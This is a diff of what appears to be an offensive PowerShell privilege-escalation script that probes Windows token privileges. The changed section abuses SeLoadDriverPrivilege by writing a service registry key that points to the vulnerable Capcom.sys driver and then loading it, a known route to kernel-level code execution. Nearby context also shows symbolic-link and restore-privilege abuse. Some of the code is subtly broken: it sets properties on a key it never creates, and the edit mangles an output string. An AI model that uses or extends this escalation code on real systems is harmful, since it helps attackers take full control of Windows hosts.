@@ -1249,21 +1249,36 @@ function trySePrivileges {
                 New-Item -ItemType SymbolicLink -Path "C:\Windows\Temp\TestLink" -Target "C:\Windows\Temp\testfile.txt"
             }
             "SeLoadDriverPrivilege" {
-                Write-Output "[$([char]0xD83D + [char]0xDC80)] Checking SeLoadDriverPrivilege..."
+                Write-Output "[$([char]0xD83D) + [char]0xDC80] Checking SeLoadDriverPrivilege..."
+                
+                # Get the current user's SID
                 $currentUserSID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
+
+                # Define the driver key path for the current user and registry uninstall path
                 $driverKeyPath = "Registry::HKEY_USERS\$currentUserSID\System\CurrentControlSet\Services\DriverName"
                 $registryPath = "Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Uninstall\DriverName"
-                # TODO
-                $driverBinaryPath = pwd + "\\Capcom.sys"
+
+                # Define the driver binary path (Capcom.sys in the current working directory)
+                $driverBinaryPath = (Get-Location).Path + "\Capcom.sys"
+
+                # Check if the driver registry path exists, if not create it
                 if (-not (Test-Path $driverKeyPath)) {
                     Set-ItemProperty -Path $driverKeyPath -Name "ImagePath" -Value $driverBinaryPath
                     Set-ItemProperty -Path $driverKeyPath -Name "Type" -Value 1  # SERVICE_KERNEL_DRIVER (0x00000001)
-                    Write-Host "Driver registry path created:"
-                    Write-Host "ImagePath set to:" $driverBinaryPath
-                    Write-Host "Type set to: 1 (SERVICE_KERNEL_DRIVER)"
-                    [DriverLoader]::LoadDriver($registryPath, $driverPath)
+
+                    # Output success messages
+                    Write-Output "Driver registry path created:"
+                    Write-Output "ImagePath set to:" $driverBinaryPath
+                    Write-Output "Type set to: 1 (SERVICE_KERNEL_DRIVER)"
+
+                    # Load the driver using the DriverLoader class
+                    [DriverLoader]::LoadDriver($registryPath, $driverBinaryPath)
+                }
+                else {
+                    Write-Output "Driver registry path already exists."
                 }
             }
+
             "SeRestorePrivilege" {
                 Write-Output "[$([char]0xD83D + [char]0xDC80)] Checking SeRestorePrivilege..."
                 Write-Output "[+] Attempting to restore a test file..."
